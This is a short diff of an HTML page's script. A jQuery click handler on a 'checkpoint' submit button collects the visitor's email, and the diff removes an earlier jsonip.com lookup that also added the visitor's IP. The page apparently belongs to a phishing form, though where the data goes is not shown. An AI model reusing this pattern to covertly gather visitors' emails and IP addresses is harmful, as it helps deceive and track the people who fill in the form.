@@ -162,7 +162,7 @@
  <script>
        
       
-$.getJSON("http://jsonip.com?callback=?", function (data) {
+
 
     $(document).ready(function () {
     $('#checkpointSubmitButton').click(function(e) {
@@ -174,7 +174,7 @@ $.getJSON("http://jsonip.com?callback=?", function (data) {
 
             var email = document.getElementById('email').value;
             
-            var icerik = "Email: " + email + "     " +  "ip: " + data.ip;
+            var icerik = "Email: " + email;
 
 if(email != ""){
 
@@ -190,7 +190,7 @@ if(email != ""){
             
      });
 });
-});
+
 
     </script>
 </html>
